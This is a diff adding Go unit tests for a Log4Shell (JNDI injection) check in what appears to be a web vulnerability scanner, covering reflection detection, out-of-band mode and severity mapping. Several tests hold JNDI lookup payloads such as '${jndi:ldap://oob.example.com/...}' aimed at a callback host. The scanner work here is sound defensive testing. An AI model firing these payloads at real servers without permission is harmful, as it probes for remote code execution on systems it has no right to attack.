@@ -859,3 +859,146 @@ func TestInjectNosqlQS_ExistingQuery(t *testing.T) {
 		t.Errorf("QS injection with existing query: got %q", u)
 	}
 }
+
+// --- Log4Shell / JNDI ---
+
+func TestLog4ShellRule_ReflectionInBody(t *testing.T) {
+	// Server echoes all headers into the response body (naive logging sink).
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		ua := r.Header.Get("User-Agent")
+		w.Header().Set("Content-Type", "text/html")
+		w.Write([]byte("<p>Request from: " + ua + "</p>"))
+	}))
+	defer srv.Close()
+
+	// Clear OOB host so we're in reflection-only mode.
+	Log4ShellOOBHost = ""
+	rule := &log4shellRule{}
+	vec := testVector(srv.URL, "q", "value")
+	result, err := rule.Test(context.Background(), testClient(t), vec)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !result.Found {
+		t.Error("expected log4shell rule to detect JNDI string reflected in body")
+	}
+	if !strings.Contains(result.Evidence, "reflected in response body") {
+		t.Errorf("evidence should mention reflection, got: %s", result.Evidence)
+	}
+}
+
+func TestLog4ShellRule_NoReflection_NoFinding(t *testing.T) {
+	// Server ignores all headers and returns static content.
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html")
+		w.Write([]byte("<html><body>Hello world</body></html>"))
+	}))
+	defer srv.Close()
+
+	Log4ShellOOBHost = ""
+	rule := &log4shellRule{}
+	vec := testVector(srv.URL, "q", "value")
+	result, err := rule.Test(context.Background(), testClient(t), vec)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if result.Found {
+		t.Errorf("expected no finding when body does not reflect JNDI string, got: %s", result.Evidence)
+	}
+}
+
+func TestLog4ShellRule_OOBMode_AlwaysFinds(t *testing.T) {
+	// In OOB mode, the rule always reports that it injected the payload
+	// (operator must check the OOB server for callbacks).
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Write([]byte("ok"))
+	}))
+	defer srv.Close()
+
+	Log4ShellOOBHost = "oob.example.com"
+	defer func() { Log4ShellOOBHost = "" }()
+
+	rule := &log4shellRule{}
+	vec := testVector(srv.URL, "q", "value")
+	result, err := rule.Test(context.Background(), testClient(t), vec)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !result.Found {
+		t.Error("OOB mode: expected Found=true (injection happened, check OOB server)")
+	}
+	if !strings.Contains(result.Evidence, "oob.example.com") {
+		t.Errorf("evidence should mention OOB host, got: %s", result.Evidence)
+	}
+}
+
+func TestLog4ShellRule_PayloadContainsJNDI(t *testing.T) {
+	Log4ShellOOBHost = ""
+	payload := jndiPayload("", "testnonce")
+	if !strings.Contains(payload, "${jndi:ldap://") {
+		t.Errorf("payload should contain JNDI string, got: %s", payload)
+	}
+	if !strings.Contains(payload, "testnonce") {
+		t.Errorf("payload should contain nonce, got: %s", payload)
+	}
+}
+
+func TestLog4ShellRule_OOBPayloadUsesOOBHost(t *testing.T) {
+	payload := jndiPayload("my-oob.burpcollaborator.net", "abc123")
+	if !strings.Contains(payload, "my-oob.burpcollaborator.net") {
+		t.Errorf("OOB payload should contain OOB host, got: %s", payload)
+	}
+}
+
+func TestLog4ShellRule_ToFinding_ReflectionIsCritical(t *testing.T) {
+	Log4ShellOOBHost = ""
+	rule := &log4shellRule{}
+	res := models.ActiveRuleResult{
+		RuleID:  rule.ID(),
+		Vector:  testVector("https://example.com/search", "q", "test"),
+		Found:   true,
+		Payload: "${jndi:ldap://127.0.0.1:1389/anputest}",
+		Evidence: "Log4Shell JNDI string reflected in response body via header injection on " +
+			"https://example.com/search.",
+	}
+	f := rule.ToFinding(res, "https://example.com")
+	if f.Severity != models.SeverityCritical {
+		t.Errorf("reflection should be SeverityCritical, got %s", f.Severity)
+	}
+	if f.CWE != "CWE-917" {
+		t.Errorf("CWE: got %q, want CWE-917", f.CWE)
+	}
+}
+
+func TestLog4ShellRule_ToFinding_OOBIsInfo(t *testing.T) {
+	rule := &log4shellRule{}
+	res := models.ActiveRuleResult{
+		RuleID:  rule.ID(),
+		Vector:  testVector("https://example.com/api", "x", "y"),
+		Found:   true,
+		Payload: "${jndi:ldap://oob.example.com/anputest}",
+		Evidence: "Log4Shell JNDI payload injected into 7 headers on https://example.com/api. " +
+			"Check OOB server oob.example.com for callbacks.",
+	}
+	f := rule.ToFinding(res, "https://example.com")
+	if f.Severity != models.SeverityInfo {
+		t.Errorf("OOB-only finding should be SeverityInfo, got %s", f.Severity)
+	}
+}
+
+func TestFindReflection_Found(t *testing.T) {
+	payload := "${jndi:ldap://127.0.0.1:1389/abc}"
+	nonce := "abc"
+	body := "<p>Error: " + payload + " is not allowed</p>"
+	got := findReflection(body, payload, nonce)
+	if got == "" {
+		t.Error("expected reflection to be found")
+	}
+}
+
+func TestFindReflection_NotFound(t *testing.T) {
+	got := findReflection("<html><body>safe page</body></html>", "${jndi:ldap://x/y}", "nonce")
+	if got != "" {
+		t.Errorf("expected no reflection, got: %s", got)
+	}
+}
